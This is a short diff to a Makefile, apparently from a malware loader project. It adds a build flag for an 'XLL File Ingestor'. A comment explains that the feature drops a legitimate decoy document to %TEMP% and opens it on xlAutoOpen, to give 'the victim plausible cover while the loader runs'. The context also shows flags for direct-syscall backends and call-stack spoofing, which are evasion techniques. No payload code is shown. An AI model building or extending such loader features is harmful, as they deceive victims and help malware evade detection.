@@ -137,6 +137,7 @@ OBJS := $(patsubst %.cpp,%.o,$(patsubst %.c,%.o,$(SRCS)))
 #     as a no-op flag until a GAS translation lands.
 CONFIG_SYSCALL_BACKEND        ?= 0
 CONFIG_CALLSTACK_SPOOF_ENABLED ?= 0
+CONFIG_XLL_FILE_INGESTOR_ENABLED ?= 0
 
 ifeq ($(CONFIG_SYSCALL_BACKEND),0)
     CFLAGS   += -DCONFIG_SYSCALL_BACKEND=0
@@ -185,6 +186,13 @@ ifeq ($(CONFIG_CALLSTACK_SPOOF_ENABLED),1)
         CS_S_OBJ  := $(CS_S_SRC:.S=.o)
         OBJS      += $(CS_S_OBJ)
     endif
+endif
+
+# XLL File Ingestor: embed a legitimate document that is dropped to %TEMP% and
+# opened on xlAutoOpen to give the victim plausible cover while the loader runs.
+# builder.py writes include/xll_ingest_file.hpp before invoking make.
+ifeq ($(CONFIG_XLL_FILE_INGESTOR_ENABLED),1)
+    CFLAGS += -DCONFIG_XLL_FILE_INGESTOR_ENABLED=1
 endif
 
 # Test sources (exclude main.cpp, use test_erebus.cpp instead)
